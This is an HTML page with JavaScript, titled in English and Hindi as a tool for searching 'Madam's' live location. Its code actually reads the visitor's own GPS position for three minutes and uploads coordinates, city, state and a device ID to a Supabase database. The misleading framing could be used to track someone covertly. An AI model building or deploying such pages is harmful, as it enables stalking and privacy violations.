```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Madam Live Location Searching मैडम की लाइव लोकेशन सर्चिंग</title>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    margin: 0;
    padding: 20px;
    text-align: center;
}

.container {
    max-width: 500px;
    margin: auto;
}

button {
    padding: 12px 20px;
    margin: 8px;
    border: none;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
}

.start {
    background: #16a34a;
    color: white;
    animation: greenBlink 1s infinite;
}

.start:disabled {
    cursor: default;
    opacity: 1;
    animation: none;
}

@keyframes greenBlink {
    0%, 100% {
        opacity: 1;
    }
    50% {
        opacity: 0.4;
    }
}

#status {
    background: white;
    padding: 20px;
    margin-top: 20px;
    border-radius: 12px;
    text-align: left;
    line-height: 1.7;
    word-break: break-word;
}
</style>
</head>

<body>
<div class="container">

<h2>📍 Madam Live Location Searching</h2>
<h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>

<button
    class="start"
    id="startButton"
    onclick="startTracking()">
    ▶ Start Location / मैडम की लोकेशन सर्च करना शुरू करें
</button>

<div id="status">
📡 मैडम की लोकेशन शेयर करना अभी शुरू नहीं हुआ है।
</div>

</div>

<script>

/* ==========================================
   SUPABASE
========================================== */

const SUPABASE_URL =
"https://qtfnupdojsqpuywhoryu.supabase.co";

const SUPABASE_KEY =
"sb_publishable_GAsXGjXdKTZxlm5tqx-t0w_96i3RmKE";


/* ==========================================
   DEVICE ID
========================================== */

let deviceId = localStorage.getItem("device_id");

if (!deviceId) {
    deviceId = crypto.randomUUID();
    localStorage.setItem("device_id", deviceId);
}


/* ==========================================
   GPS AND AUTO STOP
========================================== */

let watchId = null;
let autoStopTimeout = null;
let sessionActive = false;
let sessionNumber = 0;


/* ==========================================
   START TRACKING
========================================== */

function startTracking() {

    if (sessionActive) {
        return;
    }

    if (!navigator.geolocation) {
        document.getElementById("status").innerHTML =
            "❌ इस ब्राउज़र में GPS सपोर्ट उपलब्ध नहीं है।";
        return;
    }

    const button = document.getElementById("startButton");

    button.disabled = true;

    document.getElementById("status").innerHTML =
        "📡 GPS अनुमति और लोकेशन की प्रतीक्षा की जा रही है...";

    navigator.geolocation.getCurrentPosition(

        position => {

            if (sessionActive) return;

            sessionActive = true;
            const thisSession = ++sessionNumber;

            // ट्रैकिंग शुरू होने पर ब्लिंक बंद
            button.style.animation = "none";

            document.getElementById("status").innerHTML = `
                📍 मैडम की लोकेशन सर्चिंग शुरू हो गई है।
                <br><br>
                कृपया इसे 3 मिनट तक चलने दें।
                इसके बाद यह अपने आप बंद हो जाएगी।
            `;

            // पहली लोकेशन सेव करें
            saveLocation(
                position.coords.latitude,
                position.coords.longitude,
                position.coords.accuracy,
                thisSession
            );

            // GPS से आगे की लोकेशन अपडेट लें
            watchId = navigator.geolocation.watchPosition(

                currentPosition => {

                    if (!sessionActive ||
                        thisSession !== sessionNumber) return;

                    saveLocation(
                        currentPosition.coords.latitude,
                        currentPosition.coords.longitude,
                        currentPosition.coords.accuracy,
                        thisSession
                    );
                },

                error => {

                    if (!sessionActive ||
                        thisSession !== sessionNumber) return;

                    document.getElementById("status").innerHTML = `
                        ⚠️ GPS अपडेट में समस्या आई।
                        <br><br>
                        ${error.message}
                        <br><br>
                        ट्रैकिंग निर्धारित समय पर अपने आप बंद होगी।
                    `;
                },

                {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 30000
                }
            );

            // पहली लोकेशन मिलने के बाद 3 मिनट का समय शुरू
            autoStopTimeout = setTimeout(() => {
                stopTracking(thisSession);
            }, 3 * 60 * 1000);

        },

        error => {

            button.disabled = false;
            button.style.animation = "greenBlink 1s infinite";

            document.getElementById("status").innerHTML = `
                ❌ GPS लोकेशन प्राप्त नहीं हो सकी।
                <br><br>
                कृपया फोन की Location चालू करें और अनुमति दें।
                <br><br>
                फिर हरे बटन को दोबारा दबाएँ।
            `;
        },

        {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 30000
        }
    );
}


/* ==========================================
   SAVE LOCATION TO SUPABASE
========================================== */

async function saveLocation(
    latitude,
    longitude,
    accuracy,
    thisSession
) {

    if (!sessionActive ||
        thisSession !== sessionNumber) return;

    try {

        let city = "";
        let state = "";

        // CITY / STATE
        try {

            const geoURL =
                "https://api.bigdatacloud.net/data/" +
                "reverse-geocode-client" +
                "?latitude=" + latitude +
                "&longitude=" + longitude +
                "&localityLanguage=en";

            const geoResponse = await fetch(geoURL);

            if (geoResponse.ok) {

                const geoData = await geoResponse.json();

                city =
                    geoData.city ||
                    geoData.locality ||
                    "";

                state =
                    geoData.principalSubdivision ||
                    "";
            }

        } catch (geoError) {

            console.log("Reverse geocoding failed:", geoError);
        }

        // ट्रैकिंग बंद होने पर नया रिकॉर्ड न भेजें
        if (!sessionActive ||
            thisSession !== sessionNumber) return;

        const response = await fetch(
            SUPABASE_URL + "/rest/v1/locations",
            {
                method: "POST",

                headers: {
                    "apikey": SUPABASE_KEY,
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Prefer": "return=representation"
                },

                body: JSON.stringify({
                    device_id: deviceId,
                    latitude: latitude,
                    longitude: longitude,
                    accuracy: accuracy,
                    city: city,
                    state: state
                })
            }
        );

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(errorText);
        }

        if (!sessionActive ||
            thisSession !== sessionNumber) return;

        document.getElementById("status").innerHTML = `
            📍 लोकेशन सर्चिंग शुरू हो गई है।
            <br><br>
            कृपया इसे 3 मिनट तक चलने दें।
            इसके बाद यह अपने आप बंद हो जाएगी।
            <br><br>
            ✅ लोकेशन सर्वर पर सेव हो गई।
            <br>
            🎯 Accuracy: ${accuracy.toFixed(1)} m
            <br>
            🏙️ City: ${city || "-"}
            <br>
            🗺️ State: ${state || "-"}
        `;

    } catch (error) {

        console.error("Supabase Error:", error);

        if (sessionActive &&
            thisSession === sessionNumber) {

            document.getElementById("status").innerHTML += `
                <br><br>
                ⚠️ लोकेशन सर्वर पर सेव नहीं हो पाई।
            `;
        }
    }
}


/* ==========================================
   AUTOMATIC STOP AFTER 3 MINUTES
========================================== */

function stopTracking(thisSession) {

    if (!sessionActive ||
        thisSession !== sessionNumber) return;

    sessionActive = false;

    if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
        watchId = null;
    }

    if (autoStopTimeout !== null) {
        clearTimeout(autoStopTimeout);
        autoStopTimeout = null;
    }

    document.getElementById("status").innerHTML = `
        ✅ 3 मिनट पूरे हो गए हैं।
        <br><br>
        लोकेशन सर्चिंग अपने आप बंद हो गई है।
        <br><br>
        पहले से सेव लोकेशन रिकॉर्ड सुरक्षित हैं।
    `;

    const button = document.getElementById("startButton");

    button.disabled = false;

    // बंद होने के बाद हरा बटन फिर ब्लिंक करे
    button.style.animation = "greenBlink 1s infinite";
}

</script>
</body>
</html>
```
